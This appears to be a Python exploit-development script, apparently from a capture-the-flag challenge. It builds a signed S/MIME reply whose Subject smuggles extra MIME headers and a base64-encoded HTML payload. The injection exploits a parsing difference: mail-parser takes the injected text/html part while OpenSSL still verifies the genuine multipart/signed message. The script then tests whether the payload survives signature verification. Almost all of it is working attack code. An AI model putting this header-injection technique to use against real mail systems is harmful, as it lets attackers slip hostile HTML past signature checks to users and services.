"""Validate the revised reply shape locally, faithfully reproducing the server's
header folding (blank lines collapsed) and the smail wrapper layout.

D7 = <blank-line-prefixed injection> + trailing "Content-Transfer-Encoding : 7bit"
so the outer header block ends with:   Content-Type : text/html
                                       Content-Transfer-Encoding : 7bit
=> mail-parser (looks headers up in reverse) sees text/html/7bit at top level -> html truthy,
   while OpenSSL (looks up the first Content-Type) still sees the real multipart/signed.
"""
import base64, subprocess, os, sys, json, re
sys.path.insert(0, r'.')
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email._policybase import Policy as _P
_P.verify_generated_headers = False

EML = r'./_z_496_emls'
WSL = lambda cmd: subprocess.run(['wsl', '-d', 'kali-linux', '--', 'bash', '-lc', cmd],
                                 capture_output=True, text=True)
os.makedirs(EML, exist_ok=True)

B1 = '=' * 15 + '2152839415017920306' + '=='
from _z_496_spec import PWN, BODY

b64 = base64.b64encode(PWN.encode()).decode()


def mk_D(extra_cte):
    d = ("\r\n\r\n"
         "\n--" + B1 + " \nContent-Type : text/html\nContent-Transfer-Encoding : base64\n\n"
         + b64 + "\n--" + B1 + "-- ")
    if extra_cte:
        d += "\nContent-Transfer-Encoding : 7bit"
    return d


TEMPLATE = open(r'./_z_496\template.jinja2').read()


def build(D, tag):
    content = TEMPLATE.replace('{{ title }}', 'Re: ' + D).replace('{{ content }}', BODY)
    inner = ('Content-Type: multipart/mixed; boundary="' + B1 + '"\n'
             'MIME-Version: 1.0\n\n'
             '--' + B1 + '\nContent-Type: text/plain; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
             + content + '\n'
             '--' + B1 + '\nContent-Type: text/html; charset="us-ascii"\nMIME-Version: 1.0\nContent-Transfer-Encoding: 7bit\n\n'
             + content + '\n'
             '--' + B1 + '--\n')
    with open(os.path.join(EML, 'inner_%s.txt' % tag), 'w', newline='') as f:
        f.write(inner)
    r = WSL('cd /tmp/ostest && openssl cms -sign -in ./_z_496_emls/inner_%s.txt '
            '-signer cert.pem -inkey key.pem -outform SMIME -out ./_z_496_emls/signed_%s.eml -md sha256'
            % (tag, tag))
    if r.returncode != 0:
        print('sign failed', r.stderr[:300]); return
    signed = open(os.path.join(EML, 'signed_%s.eml' % tag)).read()
    B2 = re.search(r'boundary="([^"]+)"', signed).group(1)
    body = signed.split('\n\n', 1)[1]

    msg = MIMEMultipart('signed', protocol='application/pkcs7-signature', micalg='sha-256')
    msg.set_boundary(B2)
    msg['From'] = 'admin@ses'
    msg['To'] = 'admin@ses'
    msg['Subject'] = 'Re: ' + D
    full = msg.as_string()
    head = full.split('\n\n', 1)[0]
    reply = head + '\n\n' + body
    p = os.path.join(EML, 'reply_%s.eml' % tag)
    with open(p, 'w', newline='') as f:
        f.write(reply)

    print('=' * 20, tag, '=' * 20)
    print('--- outer header block (repr, tail) ---')
    print(repr(head[-420:]))
    r = WSL('node ./_z_496_parse.js ./_z_496_emls/reply_%s.eml' % tag)
    try:
        j = json.loads(r.stdout)
        print('TOP parse: from=%r html=%r text=%r' % (
            j.get('from'), (j.get('html') or '')[:70], (j.get('text') or '')[:70]))
        print('TOP html truthy:', bool(j.get('html')))
    except Exception:
        print('parse out:', r.stdout[:300], r.stderr[:300])
    r = WSL('cd /tmp/ostest && openssl cms -verify -in ./_z_496_emls/reply_%s.eml '
            '-CAfile cert.pem -out ./_z_496_emls/out_%s.eml; echo RC=$?' % (tag, tag))
    print('verify:', r.stdout.strip().splitlines()[-1] if r.stdout.strip() else r.stderr[:200])
    if 'RC=0' in r.stdout:
        r2 = WSL('node ./_z_496_parse.js ./_z_496_emls/out_%s.eml' % tag)
        try:
            j2 = json.loads(r2.stdout)
            print('VERIFIED parse html == PWN:', j2.get('html') == PWN)
        except Exception:
            print('verified parse out:', r2.stdout[:300])


build(mk_D(False), 'nocte')
build(mk_D(True), 'cte7bit')
